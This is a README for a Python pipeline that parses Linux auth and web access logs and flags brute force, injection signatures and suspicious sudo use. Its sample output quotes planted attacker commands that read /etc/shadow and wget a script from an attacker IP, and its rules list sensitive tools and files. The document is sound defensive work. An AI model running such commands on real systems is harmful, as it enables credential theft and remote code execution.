# Log Analysis and Anomaly Detection Pipeline

An end-to-end Python pipeline that parses raw Linux authentication logs and web server access logs with regex, analyzes them with Pandas, flags suspicious activity, and writes the results to CSV, JSON and a queryable SQLite database.

## What it detects

**Authentication logs** (`/var/log/auth.log` format)

| Rule | Severity | What it means |
|---|---|---|
| `success_after_failures` | critical | Several failed logins from an IP, then a successful one: likely compromised account |
| `brute_force` | high | Many failed logins from one IP inside a sliding time window |
| `sensitive_sudo` | high | sudo used on sensitive files or tools (`/etc/shadow`, `wget`, `useradd`, ...) |
| `off_hours_login` | medium | Successful login outside business hours |

**Web access logs** (Apache/Nginx combined format)

| Rule | Severity | What it means |
|---|---|---|
| `sql_injection`, `xss`, `path_traversal`, `sensitive_file` | high | Request path matches a known attack signature (URL-decoded first) |
| `error_burst` | medium | Burst of 4xx responses from one IP: directory scanning |
| `request_rate_outlier` | medium | IP whose request count is a statistical outlier (z-score) |

All thresholds are set in [`config/rules.yaml`](config/rules.yaml).

## Pipeline

```
raw log file
   │
   ▼
parsers.py   regex → structured records (timestamp, ip, user, event, ...)
   │
   ▼
detectors.py Pandas rules: rolling windows, z-scores, signature matching
   │
   ▼
report.py    events.csv · alerts.csv · alerts.json · logs.db (SQLite)
```

## Quick start

```bash
python -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt

# Sample logs are included in data/. To regenerate them:
python scripts/generate_sample_logs.py

python -m log_pipeline.cli --input data/sample_auth.log --format auth --year 2026 --out output/auth
python -m log_pipeline.cli --input data/sample_access.log --format access --out output/web
```

### Sample output

```
Parsed events : 303
Unparsed lines: 2
Alerts        : 6

Top alerts:
  [CRITICAL] success_after_failures   91.240.118.22    6 failures then successful login as 'deploy'
  [HIGH    ] brute_force              185.220.101.7    40 failures within 5min; users tried: admin, oracle, root, test, ubuntu
  [HIGH    ] brute_force              91.240.118.22    6 failures within 5min; users tried: deploy
  [HIGH    ] sensitive_sudo           deploy           sudo matched '/etc/shadow': /bin/cat /etc/shadow
  [HIGH    ] sensitive_sudo           deploy           sudo matched 'wget': /usr/bin/wget http://91.240.118.22/x.sh
  [MEDIUM  ] off_hours_login          91.240.118.22    Login at 02:00
```

The sample auth log tells a full attack story: a password spray against `deploy` succeeds, the attacker logs back in at 2 AM, reads `/etc/shadow` and downloads a script. The pipeline flags every step.

## Querying the results

Every run writes `logs.db`, so you can explore the results with SQL:

```bash
sqlite3 output/auth/logs.db
```

```sql
-- Top IPs by failed logins
SELECT ip, COUNT(*) AS failures
FROM events WHERE event = 'failed_password'
GROUP BY ip ORDER BY failures DESC LIMIT 10;

-- All critical and high alerts
SELECT rule, ip, user, details FROM alerts
WHERE severity IN ('critical', 'high');
```

## Using it on real logs

```bash
sudo cp /var/log/auth.log ./my_auth.log
python -m log_pipeline.cli --input my_auth.log --format auth --out output/real

python -m log_pipeline.cli --input /var/log/nginx/access.log --format access --out output/nginx
```

Syslog lines don't include the year, so pass `--year` if the log is from a past year.

## Tests

```bash
pytest -q
```

19 tests cover the parsers, each detector, and an end-to-end run that checks every attack planted in the sample logs is found.

## Project layout

```
config/rules.yaml              Detector thresholds
data/                          Sample auth and access logs
log_pipeline/parsers.py        Regex parsing into DataFrames
log_pipeline/detectors.py      Anomaly rules
log_pipeline/report.py         CSV, JSON and SQLite outputs, console summary
log_pipeline/cli.py            Command-line entry point
scripts/generate_sample_logs.py  Synthetic logs with planted attacks
tests/                         pytest suite
```

## Future work

- Stream logs with `tail -f` for near-real-time alerting
- Add GeoIP lookups to flag logins from unusual countries
- Send alerts to Slack or email
- Add an Isolation Forest model alongside the rule-based detectors

## License

MIT. See [LICENSE](LICENSE).
